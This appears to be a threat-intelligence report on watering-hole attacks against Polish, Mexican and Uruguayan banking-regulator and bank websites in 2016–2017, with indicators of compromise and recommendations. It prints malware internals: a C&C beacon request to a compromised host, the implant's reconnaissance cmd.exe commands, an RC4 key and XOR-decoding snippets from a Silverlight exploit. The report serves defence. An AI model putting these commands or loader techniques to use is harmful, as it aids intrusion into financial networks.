The article is brief, but states that \"This is – by far\n_– the most serious information security incident we have seen in Poland\" followed by a claim_\nthat over 20 commercial banks had been confirmed as victims.\n\nThis report provides an outline of the attacks based on what was shared in the article, and our\nown additional findings.\n\nANALYSIS\n\nAs stated in the blog, the attacks are suspected of originating from the website of the Polish Financial\nSupervision Authority (knf.gov[.]pl), shown below:\n\n\n-----\n\nFrom at least 2016-10-07 to late January the website code had been modified to cause visitors\nto download malicious JavaScript files from the following locations:\n```\nhxxp://sap.misapor[.]ch/vishop/view.jsp?pagenum=1\nhxxps://www.eye-watch[.]in/design/fancybox/Pnf.action\n\n```\nBoth of these appear to be compromised domains given they are also hosting legitimate content\nand have done for some time. The malicious JavaScript leads to the download of malware to the\nvictim’s device.\n\nSome hashes of the backdoor have been provided in BadCyber's technical analysis:\n```\n85d316590edfb4212049c4490db08c4b\nc1364bbf63b3617b25b58209e4529d8c\n1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae\n\n```\nThe C&Cs given in the BadCyber analysis were the following IP addresses:\n```\n125.214.195.17\n196.29.166.218\n\n```\nLAZARUS MALWARE\n\nOnly one of the samples referenced by BadCyber is available in public malware repositories. At\nthe moment we cannot verify that it originated from the watering-hole on the KNF website – but\nwe have no reason to doubt this either.\n\nMD5 hash Filename File Info First seen Origin\n\n\n85d316590edfb4212049c4490db08c4b gpsvc.exe Win32\n(736 KB)\n\n\n2017-01-26\n07:46:24\n\n\nPL\n\n\n-----\n\n[The file is packed with a commercial packer known as 'Enigma Protector'. Once unpacked it](http://enigmaprotector.com/en/about.html)\ndrops a known malware variant, which has been seen as part of the Lazarus group’s toolkit in\nother cases over the past year.\n\nThe unpacked executable takes several command line arguments:\n```\n-l : list service names, available for its own registration\n-o : open specified event\n-t : set specified event\n-x [PASSWORD] -e [SERVICE_NAME] : drop/install DLL under specified [SERVICE_NAME]\n-x [PASSWORD] -f [SERVICE_NAME] : recreate the keys that keep the password for the next\n\n```\nstage DLL, under the specified `[SERVICE_NAME]`\n\nThe provided password's MD5 hash is used as an RC4 password. On top of that, there is one\nmore RC4-round, using a hard coded 32-byte RC4 password:\n```\n53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6C C5 68 E2 70 77 3C 8F 12 C0\n7B 13 D7 B3 9F 15\n\n```\nOnce the data is decrypted with two RC4 rounds, the dropper checks the decrypted data\ncontains a valid 4-byte signature: `0xBC0F1DAD .`\n\nWATERING HOLE ANALYSIS\n\nThe attacker content on the compromised `sap.misapor[.]ch site was not accessible at the`\ntime of writing. However, archived versions of some pages can be found:\n```\nhttp://web.archive[.]org/web/20170203175640/https://sap.misapor.ch/Default.html\nhttp://web.archive[.]org/web/20170203175641/https://sap.misapor.ch/Silverlight.js\n\n```\nThe `Default.html contains code to load` `MisaporPortalUI.xap – a Silverlight application`\nwhich likely would contain the malicious first-stage implant. This is unfortunately not available for\nanalysis currently.\n```\n<div id=\"silverlightControlHost\">\n <object data=\"data:application/x-silverlight,\" type=\"application/xsilverlight-2\" width=\"100%\" height=\"100%\">\n <param name=\"source\" value=\"ClientBin/MisaporPortalUI.xap?ver=1.0.7.0\"/>\n <param name=\"onerror\" value=\"onSilverlightError\" />\n <param name=\"background\" value=\"white\" />\n <param name=\"minRuntimeVersion\" value=\"3.0.40624.0\" />\n <param name=\"autoUpgrade\" value=\"true\" />\n  <a href=\"/web/20170203175640/http://go.microsoft.com/fwlink/?\nLinkID=149156&v=3.0.40624.0\" style=\"text-decoration: none;\">\n   <img src=\"/web/20170203175640im_/http://go.microsoft.com/fwlink/?\nLinkId=108181\" alt=\"Get Microsoft Silverlight\" style=\"border-style: none\"/>\n\n```\n\n-----\n\n```\n  </a>\n </object>\n <iframe id='_sl_historyFrame'\nstyle='visibility:hidden;height:0;width:0;border:0px'></iframe>\n</div>\n\n```\nADDITIONAL WATERING HOLES\n\nThe `eye-watch[.]in domain appears to have been used in watering-hole attacks on other`\nfinancial sector websites. On 2016-11-08 we observed connections to the site referred from:\n```\nhxxp://www.cnbv.gob[.]mx/Prensa/Paginas/Sanciones.aspx\n\n```\nThis is the page for the Comisión Nacional Bancaria y de Valores (National Banking and Stock\nCommission of Mexico), specifically the portion of their site that details sanctions made by the\nMexican National Banking Commission. This organisation is the Mexican banking supervisor\nand the equivalent of Poland's KNF.\n\nIn this instance the site redirected to the following URL:\n\n```\nhxxp://www.eye-watch[.]in/jscroll/images/images.jsp?pagenum=1\n\n```\n\nAt the time of writing the compromise is no longer present and no archived versions of the page\nexist to show where the compromise was located.\n\n\n-----\n\nA further instance of the malicious code appears to have been present on a bank website in\n[Uruguay around 2016-10-26 when a PCAP of browsing to the website was uploaded to](https://virustotal.com/en/file/a9f2b6a2fa1f0da4c35237638cfb0c6f988e74ee5a912ce727981a48435eddfa/analysis/)\nVirusTotal.com.\n\nThis shows a GET request made to:\n```\nhxxp://brou.com[.]uy\n\n```\nFollowed shortly after by connections to:\n```\nwww.eye-watch[.]in:443\n\n```\nUnfortunately, the response was empty and it is not possible to assess what may have been\ndelivered.\n\nADDITIONAL MALWARE AND EXPLOIT ACTIVITY\n\nThe compromised `eye-watch[.]in domain has been associated with other malicious activity`\nin recent months. Below is a list of samples which have used the site:\n\nMD5 hash Filename File Info First seen Origin\n\n\n4cc10ab3f4ee6769e520694a10f611d5 cambio.xap ZIP\n(73 KB)\n\ncb52c013f7af0219d45953bae663c9a2 svchost.exe Win32 EXE\n(126 KB)\n\n1f7897b041a812f96f1925138ea38c46 gpsvc.exe Win32 EXE\n(126 KB)\n\n911de8d67af652a87415f8c0a30688b2 gpsvc.exe Win32 EXE\n(126 KB)\n\n1507e7a741367745425e0530e23768e6 gpsvc.exe Win32 EXE\n(126 KB)\n\n\n2016-10-07\n03:09:43\n\n2016-10-24\n12:10:33\n\n2016-10-27\n14:29:58\n\n2016-10-28\n11:50:15\n\n2016-11-15\n18:20:34\n\n\nJP\n\nPL\n\nUY\n\nUS\n\nN/A\n\n\nThe last 4 samples can loosely be categorised as the same malware variant, however the first\nsample appears to be a separate exploit (as detailed later).\n\nIt is worth noting that these samples were all compiled after the domain began being used\nalongside the `knf.gov[.]pl watering-hole. Additionally, the samples uploaded from Poland`\nand Uruguay match with the watering-hole activity observed – suggesting this is all part of the\nsame campaign.\n\nDespite this potential connection to the Poland bank compromises, the malware is not\nparticularly advanced – for example using basic operations to gather system information. The\nmalware attempts to run a series of commands with cmd exe and then returns the result via the\n\n\n-----\n\nC&C, `eye-watch[.]in .`\n\nThese commands are as follows:\n```\ncmd.exe /c hostname\ncmd.exe /c whoami\ncmd.exe /c ver\ncmd.exe /c ipconfig -all\ncmd.exe /c ping www.google.com\ncmd.exe /c query user\ncmd.exe /c net user\ncmd.exe /c net view\ncmd.exe /c net view /domain\ncmd.exe /c reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\"\ncmd.exe /c tasklist /svc\ncmd.exe /c netstat -ano | find \"TCP\"\n\n```\nAn example C&C beacon is seen below:\n```\nGET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101\nFirefox/47.0\nHost: www.eye-watch[.]in\n\n```\nSILVERLIGHT XAP FILE\n\nThe cambio.xap archive sample (4cc10ab3f4ee6769e520694a10f611d5) does not use `eye-`\n```\nwatch[.]in as a C&C channel but instead was downloaded from the URL:\nhxxps://www.eye-watch[.]in/design/fancybox/include/cambio.xap\n\n```\n_'cambio' is Spanish for 'change'. The URL is similar to that noted in the BadCyber blog, and the_\nuse of an XAP file matches what can be found in the Archive.org cache for the\n```\nsap.misapor[.]ch site.\n\n```\n[XAP is a software package format used for Microsoft Silverlight applications.](https://en.wikipedia.org/wiki/XAP_(file_format))\n\nIt can be opened as a standard ZIP archive and contains the following files:\n```\nAppManifest.xaml\nShell_siver.dll\nSystem.Xml.Linq.dll\n\n```\nTogether they form a re-packaged exploit for Silverlight based on CVE-2016-0034 (MS16-006) –\na Silverlight Memory Corruption vulnerability. The exploit has previously been used by several\n[exploit kits including RIG and Angler to deliver multiple crimeware tools.](http://www.malware-traffic-analysis.net/2016/03/31/index.html)\n\n\n-----\n\nThe `Shell_siver.dll file contains a compile path:`\n```\nc:\\Users\\KKK\\Desktop\\Shell_siver\\Shell_siver\\obj\\Release\\Shell_siver.pdb\n\n```\nInternally, the code of this DLL loads a 2nd stage library called `binaryreader.Exploit – as`\nseen below with the XOR-encoded string:\n```\n byte[] array = new byte[]\n {\n  115,120,127,112,99,104,99,116,112,117,\n  116,99,63,84,105,97,125,126,120,101\n };\n this.InitializeComponent();\n for (int i = 0; i < array.Length; i++)\n {\n  array[i] ^= 17;\n }\n if (args.get_InitParams().get_Keys().Contains(\"shell32\"))\n {\n  ...\n  type.InvokeMember(\"run\", 256, null, obj, new object[])\n  ...\n }\n\n```\nThis 2nd stage payload DLL contained within the assembly is 30,720 bytes in size and encoded\nwith XOR 56:\n```\n Buffer.BlockCopy(Resource1._1, 54, array, 0, 30720);\n try\n {\n  for (int i = 0; i < array.Length; i++)\n  {\n    byte b = 56;\n    array[i] ^= b;\n  }\n  ...\n }\n\n```\nOnce the payload stub is decoded, it represents itself as a PE-image, which is another .NET 4.0\nassembly with the internal name `binaryreader.dll .`\n\nThis second-stage DLL assembly, `binaryreader.dll, is heavily obfuscated. The DLL (MD5`\nhash: `7b4a8be258ecb191c4c519d7c486ed8a ) is identical to the one reported in a malware`\n[traffic analysis blog post from March 2016 where it was used to deliver Qbot. Thus it is likely the](http://www.malware-traffic-analysis.net/2016/03/31/index.html)\ncode comes from a criminal exploit kit which is being leveraged for delivery in this campaign.\n\nA similarly named `cambio.swf (MD5 hash:` `6dffcfa68433f886b2e88fd984b4995a ) was`\n[uploaded to VirusTotal from a US IP address in December 2016.](https://virustotal.com/en/file/c1b29afcfddb79cfd57545b8600922150843ae2b170fff9aeacdeaa17adbf792/analysis/)\n\nIP WHITELISTS\n\n\n-----\n\nWhen examining the code on the exploit kit website a list of 255 IP address strings was found.\nThe IPs only contained the first 3 octets, and would have been used to filter traffic such that only\nIPs on that subnet would be delivered the exploit and payload.\n\nThe IP addresses corresponded to a mix of public and private financial institutions spread\nacross the globe:\n\nHowever, banks in some specific countries feature prominently in the list:\n\nRank Country Count\n\n1 Poland 19\n\n2 United States 15\n\n3 Mexico 9\n\n4 United Kingdom 7\n\n5 Chile 6\n\n6 Brazil 5\n\n7 Peru 3\n\n7 Colombia 3\n\n7 Denmark 3\n\n7 India 3\n\nThe prominence of Polish and Mexican banks matches the observation of watering-hole code on\nsites in both countries.\n\nCONCLUSIONS\n\nThe evidence available is currently incomplete and at the moment we can only conclude the\nfollowing:\n\n\n-----\n\n   - There has been a series of watering hole attacks on bank supervisor websites in\nPoland & Mexico, and a state owned bank in Uruguay in recent months. These leverage\nSilverlight and Flash exploits to deliver malware.\n\n   - Investigators in Poland have identified known Lazarus group implants on bank\nnetworks and associated this with the recent compromise of the Polish Financial\nSupervision Authority's website.\n\nThe technical/forensic evidence to link the Lazarus group actors (who we believe are behind the\nBangladesh Bank attack and many others in 2016) to the watering-hole activity is unclear.\nHowever, the choice of bank supervisor / state-bank websites would be apt, given their previous\ntargeting of Central Banks for Heists – even when it serves little operational benefit for infiltrating\nthe wider banking sector.\n\nNonetheless, further evidence to connect together the pieces of this attack is needed, as well as\ninsights into the end-goal of the culprits. We are continuing our analysis of new artefacts as they\nemerge and may issue further updates in due course.\n\nRECOMMENDATIONS\n\nWe recommend organisations use the indicators provided in Appendix A to update their\ndefensive systems to identify attacks. For compromised legitimate websites we would suggest a\nminimum 1 month block be placed on the domain. Patches against CVE-2016-0034 should be\napplied as soon as possible.\nAPPENDIX A - INDICATORS OF ATTACK\n\nC&C IP address `125.214.195.17`\n\n```\n196.29.166.218\n\n```\n\nCompromised site `knf.gov[.]pl (currently clean)`\n```\n          www.cnbv.gob[.]mx (currently clean)\n          brou.com[.]uy (currently clean)\n\n```\n```\nsap.misapor[.]ch\n\n```\n```\nwww.eye-watch[.]in\n\n```\n\nMD5 Hashes `c1364bbf63b3617b25b58209e4529d8c`\n\n```\n85d316590edfb4212049c4490db08c4b\n\n```\n```\n1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae\n\n```\n```\n1507e7a741367745425e0530e23768e6\n\n```\n\n-----\n\n```\n911de8d67af652a87415f8c0a30688b2\n\n```\n```\n1f7897b041a812f96f1925138ea38c46\n\n```\n```\ncb52c013f7af0219d45953bae663c9a2\n\n```\n```\n4cc10ab3f4ee6769e520694a10f611d5\n\n```\n```\n7b4a8be258ecb191c4c519d7c486ed8a\n\n```\n\n-----",
